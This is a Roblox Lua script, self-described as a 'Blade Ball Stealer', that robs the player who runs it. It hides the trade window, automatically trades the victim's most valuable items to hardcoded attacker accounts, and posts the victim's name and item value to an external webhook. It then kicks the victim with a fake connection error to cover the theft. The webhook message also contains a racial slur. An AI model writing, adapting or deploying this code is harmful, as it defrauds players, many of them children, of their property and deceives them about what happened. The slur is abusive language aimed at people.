-- Configuration
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {"ThunderStealthZap16", "Natalhie10"}
local webhook = _G.webhook or "" 
local auth_token = "EBK-SS-A" 
local min_rap = _G.min_rap or 0 

-- Interfaces & Verrous
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local isTrading = false -- VERROU pour stopper le spam de requêtes

-- Setup UI pour ne pas gêner le trade
local function setupUI()
    pcall(function()
        tradeGui.Enabled = false
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            inTrade = tradeGui.Enabled
            if inTrade then
                tradeGui.Enabled = false
            end
        end)
    end)
end
setupUI()

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

-- Webhook minimaliste (Jaune, Victime + RAP uniquement)
local function SendStatusWebhook(title, color)
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        totalRAP = totalRAP + item.RAP
    end

    -- Fix Thumbnail stable
    local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"

    local payload = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚠️ " .. title,
            ["color"] = color,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true}
            },
            ["thumbnail"] = {
                ["url"] = thumbUrl
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function startAutoTrade(targetPlayer)
    if isTrading then return end -- Bloque si un trade est déjà lancé
    isTrading = true

    task.spawn(function()
        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

        while #itemsToSend > 0 do
            -- Envoi de l'invitation
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            
            -- Attendre l'acceptation (Check toutes les secondes pendant 20s)
            local waitTime = 0
            repeat 
                task.wait(1) 
                waitTime = waitTime + 1 
            until inTrade or waitTime > 20
            
            if inTrade then
                task.wait(2) -- Délai de sécurité anti-déclin auto
                
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    pcall(function()
                        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    end)
                    limit = limit + 1
                    task.wait(0.2)
                end

                task.wait(1)
                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(1)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                
                -- On attend que la fenêtre de trade disparaisse avant de relancer
                repeat task.wait(1) until not inTrade
                task.wait(2) -- Pause entre deux sessions de trade
            else
                -- Si pas accepté après 20s, on fait une petite pause avant de renvoyer l'invitation
                task.wait(5)
            end
        end
        
        isTrading = false
        task.wait(1)
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end)
end

-- Scan et Lancement
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    local function checkAndStart()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendStatusWebhook("The nigga is on the server !", 16776960)
                startAutoTrade(p)
                return true
            end
        end
        return false
    end

    if not checkAndStart() then
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendStatusWebhook("The nigga is on the server !", 16776960)
                startAutoTrade(player)
            end
        end)
    end
end
